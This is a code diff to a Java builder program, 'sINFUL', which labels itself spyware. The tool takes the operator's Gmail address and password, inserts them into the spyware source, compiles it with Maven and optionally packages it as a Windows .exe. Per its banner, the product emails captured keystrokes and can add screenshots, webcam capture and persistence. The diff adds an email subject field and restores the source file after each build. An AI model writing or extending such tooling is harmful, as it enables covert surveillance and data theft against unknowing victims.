@@ -27,8 +27,10 @@ public class sINFUL {
     public static final String CYAN = "\u001B[36;1m";
     public static final String WHITE = "\u001B[37;1m";
     public static Scanner scanner = new Scanner(System.in);
+    public static String initial_state;
     public static String email;
     public static String password;
+    public static String subject;
     public static int count;
     public static boolean screenshot;
     public static boolean webcam;
@@ -56,7 +58,34 @@ public class sINFUL {
     private static void waitTime(int time) throws InterruptedException {
         TimeUnit.SECONDS.sleep(time);
     }
-
+    private static String getInitialState(String file_name){
+        try {
+            File file = new File(file_name);
+            BufferedReader reader = new BufferedReader(new FileReader(file));
+            String line = "", oldtext = "";
+            while ((line = reader.readLine()) != null) {
+                oldtext += line + "\r\n";
+            }
+            reader.close();
+            return oldtext;
+        } catch (IOException ioe) {
+            System.out.println(RED + " [!] Error to generate file! " + ioe.getMessage());
+            deleteFolder("src/");
+            System.exit(0);
+        }
+        return "error";
+    }
+    private static void returnInitialState(String file_name){
+        try {
+            FileWriter writer = new FileWriter(file_name);
+            writer.write(initial_state);
+            writer.close();
+        } catch (IOException ioe) {
+            System.out.println(RED + " [!] Error to generate file! " + ioe.getMessage());
+            deleteFolder("src/");
+            System.exit(0);
+        }
+    }
     private static void replaceWord(String oldWord, String newWord, String file_name) {
         try {
             File file = new File(file_name);
@@ -187,26 +216,32 @@ public class sINFUL {
         clearScreen();
         System.out.println(""
                 + RED + "          +---------------------------------------------------+\n"
-                + RED + "    (__)  | " + YELLOW + "WARNING: Use Gmail account only!                  " + RED + "|\n"
+                + RED + "    (__)  | " + RED + "WARNING: Use Gmail account only!                  " + RED + "|\n"
                 + RED + " (|)(00)  | " + WHITE + "E-mail will be sent when it reaches the specified " + RED + "|\n"
                 + RED + "  |/(__)\\ | " + WHITE + "number of characters. Optionally you can enable   " + RED + "|\n"
                 + RED + "  |_/ _|  | " + WHITE + "Screenshot, Webcam Capture and Persistence.       " + RED + "|\n"
                 + RED + "          +---------------------------------------------------+\n");
 
-        System.out.println(YELLOW + " GENERATE SPYWARE\n" + YELLOW + " --------------------------------------------");
+        System.out.println(YELLOW + " SET UP SPYWARE\n" + YELLOW + " --------------------------------------------");
 
-        System.out.print(YELLOW + "\n [*] Enter your E-mail: " + WHITE);
+        System.out.print(BLUE +"\n [*]"+YELLOW + " Enter your E-mail: " + WHITE);
         email = scanner.nextLine();
         while (email.trim().equalsIgnoreCase("")) {
-            System.out.print(YELLOW + "\n [*] Enter your E-mail: " + WHITE);
+            System.out.print(BLUE +"\n [*]"+YELLOW + " Enter your E-mail: " + WHITE);
             email = scanner.nextLine();
         }
 
-        System.out.print(YELLOW + " [*] Enter your Password: " + WHITE);
+        System.out.print(BLUE + " [*] " + YELLOW + "Enter your Password: " + WHITE);
         password = scanner.nextLine();
         while (password.equalsIgnoreCase("")) {
-            System.out.print(YELLOW + " [*] Enter your Password: " + WHITE);
+            System.out.print(BLUE + " [*] " + YELLOW + "Enter your Password: " + WHITE);
             password = scanner.nextLine();
+        }
+        System.out.print(BLUE + " [*] " + YELLOW + "Enter your Subject Name: " + WHITE);
+        subject = scanner.nextLine();
+        while (subject.equalsIgnoreCase("")) {
+            System.out.print(BLUE + " [*] " + YELLOW + "Enter your Subject Name: " + WHITE);
+            subject = scanner.nextLine();
         }
 
         System.out.print(YELLOW + " [*] Enable Screenshot (Y/n): " + WHITE);
@@ -303,6 +338,7 @@ public class sINFUL {
                 + GREEN + " +------------------------------------------+\n"
                 + GREEN + "   Email: " + WHITE + email + "\n"
                 + GREEN + "   Password: " + WHITE + password + "\n"
+                + GREEN + "   Subject Name: " + WHITE + subject + "\n"
                 + GREEN + "   Screenshot: " + WHITE + screenshot + "\n"
                 + GREEN + "   Webcam: " + WHITE + webcam + "\n"
                 + GREEN + "   Persistence: " + WHITE + persistence + "\n"
@@ -321,10 +357,15 @@ public class sINFUL {
             } catch (IOException ex) {
                 System.out.println(ex.getMessage());
             }
-
+            //Save data
+            initial_state = getInitialState(path_source);
             // Replace data
             replaceWord("email@gmail.com", email, path_source);
+
             replaceWord("passwordemail", password, path_source);
+
+            replaceWord("subjectName", subject, path_source);
+
             if (screenshot) {
                 replaceWord("booleanScreenshot", "true", path_source);
             } else {
@@ -349,6 +390,9 @@ public class sINFUL {
 
             runProcess("mvn clean compile assembly:single", " [*] Compiling...\n");
 
+
+            returnInitialState(path_source);
+
             if (checkIfFolderExists("target/")) {
                 System.out.print(GREEN + " [*] Successfully compiled in target/ folder. \n" + WHITE);
             }
@@ -358,7 +402,7 @@ public class sINFUL {
             if (optExe.trim().equalsIgnoreCase("y")) {
                 copyFile("target/sinful-1.0-jar-with-dependencies.jar", "launch4j/sinful-1.0-jar-with-dependencies.jar");
                 runProcess("launch4j/launch4j launch4j/sINFUL.xml", " [*] Generating...\n");
-                copyFile("launch4j/saint-1.0-jar-with-dependencies.exe", "target/sinful-1.0-jar-with-dependencies.exe");
+                copyFile("launch4j/sinful-1.0-jar-with-dependencies.exe", "target/sinful-1.0-jar-with-dependencies.exe");
 
                 if (checkIfFileExists("target/sinful-1.0-jar-with-dependencies.exe")) {
                     System.out.print(GREEN + " [*] Generated .EXE in target/ folder. \n" + WHITE);
@@ -369,6 +413,7 @@ public class sINFUL {
 
             System.out.print(BLUE + "\n NOTE: Allow access to less secure apps on your gmail account. \n" + WHITE);
             System.out.print(WHITE + " -> https://www.google.com/settings/security/lesssecureapps \n" + WHITE);
+
             try {
                 waitTime(2);
             } catch (InterruptedException ex) {
